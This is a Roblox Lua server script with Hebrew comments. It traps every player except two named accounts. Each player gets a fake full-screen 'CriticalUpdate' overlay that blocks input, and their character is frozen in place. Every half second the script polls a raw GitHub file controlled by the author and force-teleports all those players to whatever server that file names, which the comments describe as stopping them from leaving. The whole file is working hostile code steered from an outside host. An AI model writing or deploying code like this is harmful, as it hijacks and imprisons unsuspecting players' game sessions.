local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")

local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"

local blockedPlayers = {
	["noamdb15"] = true,
	["dylanzyl123"] = true
}

-- פונקציה לנעילת שחקן וביטול העכבר
local function hardLock(player)
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "CriticalUpdate"
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 9999999
	screenGui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundColor3 = Color3.new(0, 0, 0)
	frame.Active = true -- חוסם לחיצות עכבר
	frame.Parent = screenGui

	-- ניסיון להעלים את העכבר (צד לקוח)
	local remote = Instance.new("RemoteEvent")
	remote.Name = "LockMouse"
	remote.Parent = game.ReplicatedStorage
end

-- נעילת תנועה (שלא יוכל לזוז אפילו סנטימטר)
Players.PlayerAdded:Connect(function(player)
	if not blockedPlayers[player.Name] then
		hardLock(player)
		player.CharacterAdded:Connect(function(char)
			local hum = char:WaitForChild("Humanoid")
			hum.WalkSpeed = 0
			hum.JumpPower = 0
			hum.PlatformStand = true
			char:WaitForChild("HumanoidRootPart").Anchored = true -- מקבע אותו לאדמה
		end)
	end
end)

-- לופ שיגור אגרסיבי (כל 0.5 שניות!)
task.spawn(function()
	while true do
		local success, response = pcall(function()
			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
		end)

		if success and response then
			local lines = {}
			for line in response:gmatch("[^\r\n]+") do
				table.insert(lines, line)
			end

			local targetPlaceId = tonumber(lines[1])
			local targetJobId = lines[2]

			if targetJobId and targetJobId ~= "" then
				for _, player in pairs(Players:GetPlayers()) do
					if not blockedPlayers[player.Name] then
						-- שיגור אגרסיבי כדי לנסות למנוע יציאה מהמשחק
						pcall(function()
							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
						end)
					end
				end
			end
		end
		task.wait(0.5) -- חצי שניה כדי להיות הכי מהיר בשרת
	end
end)
